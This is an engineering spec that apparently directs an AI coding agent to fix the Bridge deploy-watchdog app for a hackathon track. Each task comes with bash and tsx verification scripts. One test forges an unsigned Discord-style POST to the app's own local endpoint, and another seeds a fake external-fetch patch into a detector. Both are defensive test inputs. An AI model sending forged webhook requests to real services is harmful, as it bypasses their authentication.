# Bridge — Track 1 Compliance Fixes Spec

> **Companion to** `2026-05-01-bridge-design.md`. That spec built the system; this spec corrects the gaps the adversarial review found between the system and the Track 1 (Vercel WDK) marquee claims.
>
> **Goal:** A defensible Track 1 submission by the 2026-05-02 19:30 BST demo. The system must (a) actually use real WDK Hooks for pause/resume, (b) actually use `DurableAgent` from `@workflow/ai/agent` for the LLM-flavored reasoning, (c) actually prove durability with a real chaos drill, and (d) honestly describe what it is in README + tests + commit history.
>
> **Non-goals:** v0 usage (out of scope; local pool only), converting `trace`/`runtime` stub investigators to DurableAgent (deferred to `docs/future-development.md`).

## Verified preconditions (this machine, 2026-05-02 09:43 BST)

- `workflow ^4.2.4` and `@workflow/ai ^4.1.2` installed (`package.json:24`, `package.json:15`)
- `createHook`/`resumeHook` available per `node_modules/workflow/docs/foundations/hooks.mdx`
- `DurableAgent` available per `node_modules/@workflow/ai/dist/agent/durable-agent.d.ts`
- AI Gateway reachable from production (unreachable from local dev — both call sites already fall back; see `unresolved.md`)
- Discord interactions endpoint live; `lib/discord.ts` builds embeds + Ed25519-verifies inbound

## Cuttable items (priority order if context exhausts)

**Never cut:** T0.1, T0.3, T1.1 (synthesizer DurableAgent), T2 (Hook), T3 (chaos drill), T6.1.1 (Scenario A E2E), T6.7.3 (final audit).

If forced to cut, in this order (cut top first):

1. T6.4.4 + T6.4.5 + T6.4.6 + T6.4.8 (extended adversarial commit payloads — keep T6.4.1/2/3/7 which test the core detection logic)
2. T6.6.1 + T6.6.2 + T6.6.3 (extra chaos variants — T3.1 + T6.6.4 cover the load-bearing cases)
3. T6.5.2 (reset-during-pause)
4. T6.3.3 (KV outage — only relevant for local Redis anyway)
5. T6.3.6 (Discord 5xx — manual rehearsal covers it)
6. T4 (Vitest setup + 3 unit tests) — fall back to keeping the renamed smoke harness as the only "tests"
7. T1.4 (Diff investigator → DurableAgent) — keep history + dependency as the two LLM agents, leave diff as a `"use step"`
8. T0.4 (`page` action wire-up) — leave dead branch in code with a `// TODO: page action not yet wired` and remove from README claims

If we cut into the "Never cut" list, the submission is no longer Track 1 compliant — escalate before continuing.

---

## T0 — Foundation refactors and quality wins

**Description:** Low-risk, high-leverage extractions and fixes that the architectural changes in T1/T2 will lean on. Done first while context is fresh and the build is green.

### T0.1 — Extract shared verdict-level + AI-gateway helpers

#### T0.1.1 — `lib/verdict-levels.ts`

**Description:** Extract `LEVELS`, `Level` type, `SEVERITY_TO_LEVEL`, `levelIndex`, and `escalateLevel` from `workflows/synthesizer.ts`. Re-export from synthesizer for backward compatibility. Update `lib/sse-events.ts` to import from this module instead of redefining its own union.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Informational only (project CLAUDE.md override). Files in scope:
# - lib/verdict-levels.ts (new)
# - workflows/synthesizer.ts (now imports)
# - lib/sse-events.ts (now imports)
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import('./lib/verdict-levels.ts').then(({ escalateLevel, levelIndex }) => {
  if (escalateLevel('benign', 'critical') !== 'critical') throw new Error('escalate to critical failed');
  if (escalateLevel('investigate', 'low') !== 'investigate') throw new Error('preserve higher failed');
  if (levelIndex('critical') !== 3) throw new Error('rank failed');
  console.log('OK');
});
"
```

```bash
# tier4_integration
# Verify the existing watchdog smoke path still works after the extraction.
(npx next dev -p 3030 > /tmp/bridge-dev.log 2>&1 &) && \
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && \
curl -fsS http://localhost:3030/ | grep -q 'BRIDGE' ; ec=$? ; \
pkill -f 'next dev.*3030' || true ; \
exit $ec
```

#### T0.1.2 — `lib/ai-gateway.ts`

**Description:** Single `getGateway()` helper that returns the configured `createOpenAICompatible` instance. Update `workflows/synthesizer.ts` and `workflows/steps/summarize.ts` to import it. Removes the duplicated baseURL + auth header construction.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: lib/ai-gateway.ts (new), workflows/synthesizer.ts, workflows/steps/summarize.ts
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import('./lib/ai-gateway.ts').then(({ getGateway }) => {
  const gw = getGateway();
  if (typeof gw.chatModel !== 'function') throw new Error('chatModel missing');
  console.log('OK');
});
"
```

```bash
# tier4_integration
# summarize step still produces a tldr (mock fallback path is fine; AI Gateway unreachable from local).
npx tsx --input-type=module -e "
import('./workflows/steps/summarize.ts').then(async ({ summarize }) => {
  const r = await summarize({ files: [{ path: 'a.ts', patch: '+x' }], commit_message: 'test' });
  if (typeof r.tldr !== 'string' || r.tldr.length < 5) throw new Error('tldr missing');
  console.log('OK');
});
"
```

### T0.2 — Quality fixes (concurrency, batching, observability)

#### T0.2.1 — `Promise.allSettled` for investigator dispatch

**Description:** `workflows/watchdog.ts:dispatchInvestigators` uses `Promise.all`, so one investigator's throw kills the whole fan-out — directly contradicting the "durable parallel agents" claim. Switch to `Promise.allSettled` and convert rejections to `{ agent, status: 'failed' }` results so the synthesizer can still produce a verdict.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/watchdog.ts
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import('./workflows/watchdog.ts').then(async () => {
  // dispatchInvestigators is private; smoke via watchdog with _force_score and a stub that throws.
  // Instead, validate behavior via a small standalone test of allSettled fallback shape.
  const results = await Promise.allSettled([Promise.resolve({ agent: 'a', status: 'complete' }), Promise.reject(new Error('boom'))]);
  if (results[0].status !== 'fulfilled' || results[1].status !== 'rejected') throw new Error('settle');
  console.log('OK');
});
"
```

```bash
# tier4_integration
# Forcing a high score with one stubbed-throwing investigator must still produce a verdict in KV.
# Covered indirectly by T3.1 chaos drill — dispatch failure mode is rare and integration-asserted there.
echo "deferred to T3.1.1"
```

#### T0.2.2 — Single-pass `extract-signals`

**Description:** `workflows/steps/extract-signals.ts` iterates `ingest.files` six times, once per detector. Replace with a single pass that accumulates all hits in one walk. Pure refactor — same outputs.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/steps/extract-signals.ts
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import('./workflows/steps/extract-signals.ts').then(async ({ extractSignals }) => {
  const before = await extractSignals({ files: [{ path: 'src/auth/login.ts', patch: \"+fetch('https://x')\" }], author: 'u', commit_message: 'm', commit_ts: new Date().toISOString() });
  if (!before.external_fetch || !before.auth_path) throw new Error('signals missing');
  console.log('OK');
});
"
```

```bash
# tier4_integration
# Single-pass change is internal; covered by watchdog T3.1 end-to-end. Tier3 is sufficient.
echo "covered by T3.1.1"
```

#### T0.2.3 — Batched KV reads in `history` investigator

**Description:** `workflows/investigators/history.ts:52` reads `history:hour:${file.path}` per-file in a sequential loop. Convert to `Promise.all` over all file keys. (Note: this file is replaced in T1.2; this stage is a cheap interim fix in case T1.2 has to be cut.)

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/investigators/history.ts
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import('./workflows/investigators/history.ts').then(async ({ historyInvestigator }) => {
  const r = await historyInvestigator({ deploy_id: 'test_t023', sha: 'abc', files: [{ path: 'a.ts' }, { path: 'b.ts' }], author: 'u' });
  if (r.agent !== 'history' || !['complete', 'failed'].includes(r.status)) throw new Error('shape');
  console.log('OK');
});
"
```

```bash
# tier4_integration
# Same as T0.2.2 — covered by watchdog end-to-end in T3.1.1.
echo "covered by T3.1.1"
```

#### T0.2.4 — Batched scans in `/api/stream/deploys`

**Description:** `app/api/stream/deploys/route.ts` runs four `kv.list` scans + N+1 `kv.get` per poll, then a redundant rescan to rebuild `lastSeenKeys`. Collapse into one pass that lists once and reuses the keys. Drop the rescan.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: app/api/stream/deploys/route.ts
```

```bash
# tier3_unit
# Pure handler — exercised at integration. No isolated unit covering streaming behavior.
echo "behavior-tested in tier4"
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/bridge-dev.log 2>&1 &) && \
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && \
( timeout 4 curl -fsSN http://localhost:3030/api/stream/deploys 2>/dev/null | head -c 200 | grep -q 'data:' ) ; ec=$? ; \
pkill -f 'next dev.*3030' || true ; \
exit $ec
```

#### T0.2.5 — Replace silent catches with `console.warn`

**Description:** `synthesizer.ts:154`, `watchdog.ts:267`, `summarize.ts:43`, `_base.ts:39`, `discord.ts` (multiple) currently swallow errors with `// fallback` comments. Add minimal `console.warn(...)` lines with the operation context — no telemetry SDK, just observable failure.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/synthesizer.ts, workflows/watchdog.ts, workflows/steps/summarize.ts, workflows/investigators/_base.ts, lib/discord.ts
```

```bash
# tier3_unit
# Behavior unchanged; signal is operational. No unit assertion needed.
echo "no behavior change"
```

```bash
# tier4_integration
# Trigger an intentional KV failure path and grep dev log for warn output.
echo "covered by T3.1.1 chaos drill output"
```

### T0.3 — Slack→Discord drift cleanup

#### T0.3.1 — Drop `@slack/web-api`, rename hook token

**Description:** Remove `@slack/web-api` from `package.json` (dead dep). Rename the KV signal token from `slack:ack:${deploy_id}` to `deploy:ack:${deploy_id}` everywhere — `watchdog.ts:buildSignalName`, `app/api/discord/interactions/route.ts:57`. Token will be replaced entirely by WDK Hook in T2.1; this stage just makes the interim-state names honest.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: package.json, workflows/watchdog.ts, app/api/discord/interactions/route.ts
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import('./workflows/watchdog.ts').then(({ buildSignalName }) => {
  if (buildSignalName('abc') !== 'deploy:ack:abc') throw new Error('rename failed');
  console.log('OK');
});
"
```

```bash
# tier4_integration
# Build still succeeds and dev server boots after dep removal.
test ! -d node_modules/@slack/web-api || (echo "still installed"; exit 1) && \
(npx next dev -p 3030 > /tmp/bridge-dev.log 2>&1 &) && \
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done ; ec=$? ; \
pkill -f 'next dev.*3030' || true ; \
exit $ec
```

#### T0.3.2 — UI label fixes

**Description:** Fix `app/(warroom)/components/StatusBlock.tsx:54` ("deploys · slack" → "deploys · discord"), `ArchDiagram.tsx:13` ("Slack page" → "Discord page"), and any other `slack` literals in `app/(warroom)/`.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: app/(warroom)/components/StatusBlock.tsx, app/(warroom)/components/ArchDiagram.tsx
```

```bash
# tier3_unit
# Verify no remaining literal "slack" in war-room components.
! grep -rin 'slack' app/\(warroom\)/components/ 2>/dev/null
```

```bash
# tier4_integration
(npx next dev -p 3030 > /tmp/bridge-dev.log 2>&1 &) && \
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && \
curl -fsS http://localhost:3030/ | grep -qiv 'slack' ; ec=$? ; \
pkill -f 'next dev.*3030' || true ; \
exit $ec
```

#### T0.3.3 — Update CLAUDE.md ABSOLUTE constraint

**Description:** `CLAUDE.md` Project-Specific Constraints table line 1 still says "Never fake the Slack pause/resume — it must be a real WDK signal/wait round-trip with a real Slack interaction". Replace with: "Pause/resume must be a real WDK Hook (`createHook`/`resumeHook`) round-trip with a real Discord button interaction. Polling KV is forbidden."

**Verify:**

```bash
# tier1_build
test -f CLAUDE.md && grep -q 'createHook' CLAUDE.md
```

```bash
# tier2_simplify
# Docs-only; no simplifier.
```

```bash
# tier3_unit
! grep -i 'slack' CLAUDE.md | grep -v 'pivot\|legacy\|former'
```

```bash
# tier4_integration
# Docs-only stage; no integration surface.
echo "docs-only"
```

### T0.4 — Wire up `page` action

#### T0.4.1 — Discord page button + handler branch

**Description:** `applyAck` in `watchdog.ts` already handles `action_type: 'page'` (sets `paged_at`), but Discord interactions handler only accepts `ack`/`hold`. Add a third button to `lib/discord.ts:buildPageEmbed` (label "PAGE ON-CALL", style 4 = danger), accept `page` in `app/api/discord/interactions/route.ts`, and confirm the verdict record carries `paged_at` after a `page` button click.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: lib/discord.ts, app/api/discord/interactions/route.ts
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import('./lib/discord.ts').then(({ buildPageEmbed }) => {
  const { row } = buildPageEmbed({ deploy_id: 'abc', verdict: { level: 'critical', summary: 's', concerns: ['c1','c2','c3'], suggested_action: 'a' } });
  const ids = (row.components || []).map(c => c.custom_id);
  if (!ids.some(id => id?.startsWith('page:'))) throw new Error('page button missing');
  console.log('OK');
});
"
```

```bash
# tier4_integration
# Hook integration with page action covered in T2.1.2 below.
echo "covered by T2.1.2"
```

---

## T1 — DurableAgent integration

**Description:** Replace `generateText` calls with `DurableAgent` from `@workflow/ai/agent` in the synthesizer and the three LLM-flavored investigators (history, dependency, diff). Each investigator becomes a separate `"use workflow"` sub-workflow that internally instantiates one DurableAgent. `trace` and `runtime` stay as `"use step"` (deferred per `docs/future-development.md`).

**Why each investigator becomes its own `"use workflow"` and not just a step calling DurableAgent:** Per `node_modules/workflow/docs/foundations/hooks.mdx` and the Track 1 pitch, the durability story is a "tree of workflows that survive crashes". Sub-workflows give each agent its own retry/observability scope, independent failure isolation, and the architecture diagram in the README becomes literally true.

### T1.1 — Synthesizer DurableAgent

#### T1.1.1 — Refactor `workflows/synthesizer.ts` to `DurableAgent`

**Description:** Keep file as `"use step"` (it's invoked from inside the watchdog workflow, no need to be a sub-workflow). Replace `generateText` block (lines 137–157) with `DurableAgent` configured with the gateway model. Use `Output.object({ schema: z.object({...}) })` from `@workflow/ai/agent` for structured output instead of fence-stripping JSON. Keep `derivedVerdict` fallback; keep `parseLLMVerdict` exported for the unit test.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/synthesizer.ts
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import('./workflows/synthesizer.ts').then(({ derivedVerdict }) => {
  const v = derivedVerdict({ findings: [{ agent: 'h', severity: 'critical', summary: 'auth touched' }], signals: {}, score: 0.9 });
  if (v.level !== 'critical') throw new Error('expected critical');
  if (v.concerns.length < 3) throw new Error('concerns shape');
  console.log('OK');
});
"
```

```bash
# tier4_integration
# Mock fallback path: AI Gateway unreachable from local → derivedVerdict returns. Synthesizer writes verdict to KV.
npx tsx --input-type=module -e "
import('./workflows/synthesizer.ts').then(async ({ synthesize }) => {
  const v = await synthesize({ deploy_id: 'test_t111', findings: [{ agent: 'h', severity: 'high', summary: 's' }], signals: {}, score: 0.7 });
  if (!['benign','watch','investigate','critical'].includes(v.level)) throw new Error('bad level');
  const { kv } = await import('./lib/db.ts');
  const stored = await kv.get('verdicts:test_t111');
  if (!stored) throw new Error('verdict not persisted');
  await kv.del('verdicts:test_t111');
  console.log('OK');
});
"
```

### T1.2 — History investigator → DurableAgent sub-workflow

#### T1.2.1 — Create `workflows/agents/history.ts`

**Description:** New file at `workflows/agents/history.ts` with `"use workflow"` directive. Exports `historyAgent(input: InvestigatorInput): Promise<InvestigatorResult>`. Internally instantiates one `DurableAgent` with two tools: `lookupAuthorHistory(deploy_id)` and `lookupCochangeHistory(file)`, both reading existing `history:author:*` and `history:cochange:*` KV records via `lib/db`. Keep the deterministic computation in the existing `workflows/investigators/history.ts` exported as `historyDeterministic` so the agent can call it as a fast path, and so the unit test surface persists.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/agents/history.ts (new), workflows/investigators/history.ts
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import('./workflows/investigators/history.ts').then(async ({ historyDeterministic }) => {
  const r = await historyDeterministic({ deploy_id: 'test_t121', sha: 'abc', files: [{ path: 'a.ts' }], author: 'u' });
  if (r.agent !== 'history' || !['complete','failed'].includes(r.status)) throw new Error('shape');
  console.log('OK');
});
"
```

```bash
# tier4_integration
# Verify the new sub-workflow is reachable via watchdog dispatch when score >= threshold (covered in T3.1.1).
echo "covered by T3.1.1"
```

#### T1.2.2 — Switch watchdog to call `historyAgent`

**Description:** Update `workflows/watchdog.ts:dispatchInvestigators` to import from `./agents/history` instead of `./investigators/history`. Both files exist in parallel until T5.1.1 cleans up.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/watchdog.ts
```

```bash
# tier3_unit
grep -q "from \"./agents/history\"" workflows/watchdog.ts
```

```bash
# tier4_integration
echo "covered by T3.1.1"
```

### T1.3 — Dependency investigator → DurableAgent sub-workflow

#### T1.3.1 — Create `workflows/agents/dependency.ts`

**Description:** Mirror T1.2.1 for dependency. New `"use workflow"` file. DurableAgent with one tool: `analyzeManifestDelta(files)` which compares old/new `package.json` snippets. Existing `workflows/investigators/dependency.ts` keeps its deterministic logic exported as `dependencyDeterministic`.

**Verify:** (same shape as T1.2.1 — substitute file paths)

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/agents/dependency.ts (new), workflows/investigators/dependency.ts
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import('./workflows/investigators/dependency.ts').then(async ({ dependencyDeterministic }) => {
  const r = await dependencyDeterministic({ deploy_id: 't131', sha: 'a', files: [{ path: 'package.json', patch: '+\"x\":\"1\"' }] });
  if (r.agent !== 'dependency') throw new Error('shape');
  console.log('OK');
});
"
```

```bash
# tier4_integration
echo "covered by T3.1.1"
```

#### T1.3.2 — Switch watchdog to call `dependencyAgent`

**Description:** Update `workflows/watchdog.ts:dispatchInvestigators` import.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/watchdog.ts
```

```bash
# tier3_unit
grep -q "from \"./agents/dependency\"" workflows/watchdog.ts
```

```bash
# tier4_integration
echo "covered by T3.1.1"
```

### T1.4 — Diff investigator → DurableAgent sub-workflow

#### T1.4.1 — Create `workflows/agents/diff.ts`

**Description:** Mirror T1.2.1 / T1.3.1. New `"use workflow"` file. DurableAgent with one tool: `summarizeDiffChunks(files)` which produces a short risk-flavored summary of the patch. Existing logic kept as `diffDeterministic`.

**Verify:** (same shape)

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/agents/diff.ts (new), workflows/investigators/diff.ts
```

```bash
# tier3_unit
npx tsx --input-type=module -e "
import('./workflows/investigators/diff.ts').then(async ({ diffDeterministic }) => {
  const r = await diffDeterministic({ deploy_id: 't141', sha: 'a', files: [{ path: 'a.ts', patch: '+1' }] });
  if (r.agent !== 'diff') throw new Error('shape');
  console.log('OK');
});
"
```

```bash
# tier4_integration
echo "covered by T3.1.1"
```

#### T1.4.2 — Switch watchdog to call `diffAgent`

**Description:** Update `workflows/watchdog.ts:dispatchInvestigators` import.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/watchdog.ts
```

```bash
# tier3_unit
grep -q "from \"./agents/diff\"" workflows/watchdog.ts
```

```bash
# tier4_integration
echo "covered by T3.1.1"
```

---

## T2 — Real WDK Hook for pause/resume

**Description:** Replace the `kv.get` polling loop in `watchdog.ts:waitForSignal` with `using hook = createHook<AckPayload>({ token: \`deploy:ack:\${sha}\` })` + `await hook`. Replace the Discord interactions handler's `kv.set` write with `resumeHook(token, payload)`. After this stage, the workflow truly suspends in WDK runtime (durable across function termination) and resumes only when Discord button click triggers `resumeHook`. This is the load-bearing Track 1 fix.

### T2.1 — Hook + resumeHook end-to-end

#### T2.1.1 — Refactor `watchdog.ts` `synthesizeAndPage` to use `createHook`

**Description:** Inside `synthesizeAndPage`:
1. After posting Discord embed, declare `using hook = createHook<AckPayload>({ token: \`deploy:ack:\${sha}\` })`.
2. Replace `await waitForSignal(...)` with `await hook` (with a wrapping `Promise.race` against `setTimeout(WDK_PAUSE_MAX_SECONDS * 1000)` for the timeout fallback — `setTimeout` inside a `"use workflow"` is durable).
3. Delete `waitForSignal` and `sendAck` functions and the `signal:` KV write path.
4. Keep `pause_state:${sha}` write so the war-room dashboard can show "paused at" status.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/watchdog.ts
```

```bash
# tier3_unit
# Verify createHook is imported, polling loop is gone.
grep -q "createHook" workflows/watchdog.ts && \
! grep -q "while (Date.now() < deadline)" workflows/watchdog.ts && \
! grep -q "setInterval\|setTimeout(r, 1000)" workflows/watchdog.ts
```

```bash
# tier4_integration
echo "covered by T2.1.2 + T3.1.1"
```

#### T2.1.2 — Discord interactions handler calls `resumeHook`

**Description:** `app/api/discord/interactions/route.ts`: replace `await kv.set(\`signal:slack:ack:\${deployId}\`, ...)` with `await resumeHook(\`deploy:ack:\${deployId}\`, payload)`. Import from `workflow/api`. Catch `HookNotFoundError` and respond 404 (Discord shows the user a "deploy not found" toast).

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: app/api/discord/interactions/route.ts
```

```bash
# tier3_unit
grep -q 'resumeHook' app/api/discord/interactions/route.ts && \
! grep -q 'signal:slack:ack' app/api/discord/interactions/route.ts
```

```bash
# tier4_integration
# End-to-end: dev server up, simulate Discord button POST, watchdog must resume.
# Full chaos drill is T3.1.1; here we just verify the route returns 404 on a non-existent deploy_id (HookNotFoundError path).
(npx next dev -p 3030 > /tmp/bridge-dev.log 2>&1 &) && \
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done && \
# Forge a Discord-shaped POST with bogus deployId; expect 404 (no such hook). Signature check will fail first → 401, which is fine for this stage.
status=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://localhost:3030/api/discord/interactions -H 'content-type: application/json' --data '{"type":3,"data":{"custom_id":"ack:nonexistent"}}') ; \
test "$status" = "401" -o "$status" = "404" ; ec=$? ; \
pkill -f 'next dev.*3030' || true ; \
exit $ec
```

---

## T3 — Real durability test (replace chaos-drill theatre)

**Description:** The current `scripts/chaos-drill.sh` kills the dev server *before* the workflow pauses and "verifies" by curl-grepping `CRITICAL` from the SSR'd home page (which is regenerated by the client-side `useDemo` simulator on reconnect). Rewrite to actually pause a workflow at the WDK Hook, kill the runtime, restart, fire a Discord-shaped resume, and assert the same workflow instance writes `acknowledged_at` to `verdicts:${sha}` in KV.

### T3.1 — Real chaos drill

#### T3.1.1 — Implement honest chaos drill

**Description:** Rewrite `scripts/chaos-drill.sh`:
1. Start dev on port 3030, wait for ready.
2. POST to `/api/webhooks/github` with a synthesized push event whose SHA forces a high score (use existing `_force_score: 0.9` helper or fixture).
3. Poll KV for `pause_state:${sha}` to confirm the workflow has actually reached the Hook (with timeout — fail-fast if not paused within 10s).
4. SIGKILL the dev server (`pkill -KILL -f 'next dev.*3030'`).
5. Restart dev server.
6. POST to `/api/discord/interactions` a signed payload that calls `resumeHook(\`deploy:ack:\${sha}\`, { action_type: 'ack', user: { id: 'chaos', username: 'chaos' } })`. (Use a real signing key from `.env.local` or a test bypass flag.)
7. Poll KV for `verdicts:${sha}` until `acknowledged_at` is set, with a 30s timeout.
8. Repeat 5 times. All five must succeed.

**Verify:**

```bash
# tier1_build
test -x scripts/chaos-drill.sh && bash -n scripts/chaos-drill.sh
```

```bash
# tier2_simplify
# Files in scope: scripts/chaos-drill.sh
```

```bash
# tier3_unit
# Behavior tested at integration; static check is sufficient at unit.
grep -q 'pause_state:' scripts/chaos-drill.sh && \
grep -q 'pkill -KILL' scripts/chaos-drill.sh && \
grep -q 'resumeHook\|/api/discord/interactions' scripts/chaos-drill.sh && \
grep -q 'acknowledged_at' scripts/chaos-drill.sh
```

```bash
# tier4_integration
# The drill itself IS the integration test. Run it once successfully.
bash scripts/chaos-drill.sh
```

#### T3.1.2 — Five consecutive successful runs

**Description:** Run `scripts/chaos-drill.sh` five times in a row. All must pass with no flakes. Per CLAUDE.md project constraint: "demo commit must trigger cleanly 5+ times in rehearsal".

**Verify:**

```bash
# tier1_build
echo "no build artifact"
```

```bash
# tier2_simplify
# No code change.
```

```bash
# tier3_unit
echo "covered at integration"
```

```bash
# tier4_integration
for i in 1 2 3 4 5; do bash scripts/chaos-drill.sh || exit $?; done
```

---

## T4 — Real test suite (replace "28 integration tests" claim)

**Description:** The recent commit `8b84908` claims "28 tests" but adds only one shell script of external pings. Add Vitest with three real behavioral tests for the pure-logic modules. Rename the smoke harness to stop calling itself a test suite.

### T4.1 — Vitest setup

#### T4.1.1 — Add Vitest

**Description:** `npm install -D vitest`. Add `"test": "vitest run"` script. Create `vitest.config.ts` with `test.environment = 'node'`. Confirm `npm test` runs (with zero tests yet).

**Verify:**

```bash
# tier1_build
test -f vitest.config.ts && grep -q 'vitest' package.json
```

```bash
# tier2_simplify
# Files in scope: package.json, vitest.config.ts
```

```bash
# tier3_unit
npm test -- --run --reporter=basic
```

```bash
# tier4_integration
# Test runner is itself the harness; tier3 is sufficient.
echo "covered at tier3"
```

### T4.2 — Behavioral unit tests

#### T4.2.1 — `lib/score.test.ts`

**Description:** Table-driven tests for `score()`, `compoundBonus()`, `firingTriples()`. Cover: zero signals → 0; all-1 signals → ~1.0; partial → weighted sum; null → 0; compound triple firing → bonus.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: lib/score.test.ts (new)
```

```bash
# tier3_unit
npm test -- --run lib/score.test.ts
```

```bash
# tier4_integration
echo "unit-only"
```

#### T4.2.2 — `workflows/synthesizer.test.ts`

**Description:** Tests for `derivedVerdict()` (table-driven across all level transitions), `parseLLMVerdict()` (fence-stripping, malformed JSON, valid response), `escalateLevel()`.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/synthesizer.test.ts (new)
```

```bash
# tier3_unit
npm test -- --run workflows/synthesizer.test.ts
```

```bash
# tier4_integration
echo "unit-only"
```

#### T4.2.3 — `workflows/watchdog.test.ts`

**Description:** Tests for `validateAckPayload()` (valid, missing fields, bad action), `applyAck()` (idempotent on second call, hold sets `held_until`, page sets `paged_at`), `computeTimeoutAt()`, `buildSignalName()`.

**Verify:**

```bash
# tier1_build
npx tsc --noEmit
```

```bash
# tier2_simplify
# Files in scope: workflows/watchdog.test.ts (new)
```

```bash
# tier3_unit
npm test -- --run workflows/watchdog.test.ts
```

```bash
# tier4_integration
echo "unit-only"
```

### T4.3 — Rename smoke harness

#### T4.3.1 — `test-integrations.sh` → `smoke-integrations.sh`

**Description:** `git mv scripts/test-integrations.sh scripts/smoke-integrations.sh`. Update README references and any commit-time docs that called it "tests". Add a one-line header comment in the file explaining it is a smoke harness (live external pings, not unit/integration tests in the usual sense).

**Verify:**

```bash
# tier1_build
test -x scripts/smoke-integrations.sh && ! test -e scripts/test-integrations.sh
```

```bash
# tier2_simplify
# Docs+rename; no code logic changes.
```

```bash
# tier3_unit
# Header comment present.
head -3 scripts/smoke-integrations.sh | grep -q -i 'smoke'
```

```bash
# tier4_integration
echo "rename-only"
```

---

## T5 — Documentation truth-up

### T5.1 — README aligned with code

#### T5.1.1 — README claims match implementation

**Description:** Update `README.md` to reflect:
- Three of five investigators are `DurableAgent` sub-workflows (history, dependency, diff). Trace and runtime are deterministic stubs (per `docs/future-development.md`).
- Discord (not Slack) is the human-in-the-loop channel.
- Pause/resume is a real WDK Hook (`createHook`/`resumeHook`).
- The button on the war-room page is "Force replay" — auto-run is the default first-paint behavior via `useDemo`.
- The "tests" badge/section reflects: 3 Vitest unit files + 1 chaos drill + 1 smoke harness — not "28 tests".

**Verify:**

```bash
# tier1_build
grep -q 'createHook' README.md && grep -q 'Discord' README.md && ! grep -qi 'Slack' README.md
```

```bash
# tier2_simplify
# Docs only.
```

```bash
# tier3_unit
# README has zero "DurableAgent" claims that contradict code.
grep -c 'DurableAgent' README.md  # should be small, accurate
```

```bash
# tier4_integration
echo "docs-only"
```

### T5.2 — Future development plan

#### T5.2.1 — `docs/future-development.md`

**Description:** New file documenting deferred work. Sections:
1. **v2 — Convert `trace` and `runtime` to DurableAgent sub-workflows.** Stub agent shape, tool list (for `runtime`: a metrics-fetch tool against an OTel collector; for `trace`: a sourcemap-resolution tool).
2. **v2 — Per-investigator Hook for triage-time human steering.** Lets a reviewer answer "is this auth path?" mid-investigation rather than only at the final verdict.
3. **v2 — Vercel Queues fan-out.** When deploys exceed N concurrent, push to a Queue and let WDK consume.
4. **v2 — OpenTelemetry observability via `@workflow/ai` telemetry hooks.**
5. **v2 — Replace deterministic-fallback flag day with `DurableAgent` retries.**

**Verify:**

```bash
# tier1_build
test -f docs/future-development.md
```

```bash
# tier2_simplify
# Docs only.
```

```bash
# tier3_unit
grep -q 'trace' docs/future-development.md && grep -q 'runtime' docs/future-development.md
```

```bash
# tier4_integration
echo "docs-only"
```

---

## T6 — Adversarial end-to-end testing on `meridian-core-banking`

**Description:** The final gate. Up to this point each stage has tested its own slice. T6 exercises the full system against the real demo target repo (`../meridian-core-banking`), against the real deployed Vercel URL where possible, with real Discord webhook signatures, against real KV. Every plausible adversarial input, race condition, and failure mode is asserted explicitly. Nothing is mocked unless explicitly noted.

